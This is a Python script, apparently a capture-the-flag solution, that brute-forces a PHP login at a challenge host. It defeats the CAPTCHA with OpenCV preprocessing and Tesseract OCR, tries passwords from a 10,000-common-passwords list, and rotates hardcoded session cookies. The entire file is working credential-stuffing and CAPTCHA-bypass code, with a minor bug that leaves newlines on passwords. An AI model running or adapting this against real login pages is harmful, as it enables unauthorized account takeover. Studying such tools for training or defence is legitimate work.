import requests
from PIL import Image
import pytesseract
import io
import cv2
import numpy as np

cookies = {
    'PHPSESSID': 'ab79f24ab2c27dc6c74834a0c1097a9e',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': 'PHPSESSID=ab79f24ab2c27dc6c74834a0c1097a9e',
    'DNT': '1',
    'Origin': 'http://icc.metaproblems.com:5750',
    'Referer': 'http://icc.metaproblems.com:5750/',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36',
}

data = {
    'username': 'scriptkitty',
    'password': 'test',
    'captcha_code': '',
    'submit': 'submit',
}

getImage = requests.get('http://icc.metaproblems.com:5750/visualCaptcha/getImage.php',cookies=cookies,headers=headers,verify=False,)

def ocr(image):
    # Convert image to OpenCV format (NumPy array)
    image_cv = np.array(image)
    try:
        gray = cv2.cvtColor(image_cv, cv2.COLOR_RGB2GRAY)
    except:
        return "FAIL"

    # Apply some preprocessing to clean up the image
    # You can experiment with different methods (e.g., blurring, adaptive thresholding)
    # Convert to binary using thresholding
    _, thresh = cv2.threshold(gray, 150, 255, cv2.THRESH_BINARY_INV)

    # Optional: Apply morphological transformations to remove noise
    kernel = np.ones((2, 2), np.uint8)
    thresh = cv2.morphologyEx(thresh, cv2.MORPH_OPEN, kernel)

    # Optional: Resize the image if the characters are too small
    thresh = cv2.resize(thresh, None, fx=2, fy=2, interpolation=cv2.INTER_LINEAR)

    # Debug: Display the processed image to inspect how well it's cleaned up
    #cv2.imshow('Processed CAPTCHA', thresh)
    #cv2.waitKey(0)
    #cv2.destroyAllWindows()

    # Perform OCR on the processed image
    captcha_text = pytesseract.image_to_string(thresh, config='--psm 8')  # Using psm 8 for single word/character mode

    # Clean up the result (remove non-alphanumeric characters)
    captcha_text = ''.join(filter(str.isalnum, captcha_text))
    return captcha_text



def get_captcha(image):

    return "everything sucks"

image = Image.open(io.BytesIO(getImage.content))
#image.show()
print(ocr(image))
print("-"*10)
print(get_captcha(image))


cnt = 0
tested = 511

import argparse


parser = argparse.ArgumentParser()

parser.add_argument('-s', "--start", type=int)  
parser.add_argument('-e', "--end",type=int)    
parser.add_argument('-i', "--id", type=int)
args = parser.parse_args()
start = args.start
end = args.end
phpID = args.id

ids = ['ab79f24ab2c27dc6c74834a0c1097a9e','014e836b9c74a67c9534fe8c0ea108be','8c1d284dc0149f5d58ce30f4b62b0dd3','0d15a48e4554283406e00448104555a8','68c7c3419c35d75526be0062db677a15','a']

cookies['PHPSESSID'] = ids[phpID] if phpID < len(ids) else str(phpID)

f=open("10k-most-common.txt").readlines()
for i in range(start,end):
    line = f[i]

    
    line.strip()
    data['password'] = line
    getImage = requests.get('http://icc.metaproblems.com:5750/visualCaptcha/getImage.php',cookies=cookies,headers=headers,verify=False,)
    image = Image.open(io.BytesIO(getImage.content))
    data['captcha_code'] = ocr(image)

    #print(data['captcha_code'])
    while True:
        response = requests.post('http://icc.metaproblems.com:5750/', cookies=cookies, headers=headers, data=data, verify=False)
        if "Please try again." in response.text:
            #tested+=1
            print("SUCCESSFUL CAPTCHA", i+1)
            break
        elif "Invalid CAPTCHA." in response.text:
            while True:
                getImage = requests.get('http://icc.metaproblems.com:5750/visualCaptcha/getImage.php',cookies=cookies,headers=headers,verify=False,)
                image = Image.open(io.BytesIO(getImage.content))
                data['captcha_code'] = ocr(image)
                if len(data['captcha_code']) == 5:
                    break
            #print("FAILED CAPTCHA")
            #exit()
        else:
            print(line)
            exit()

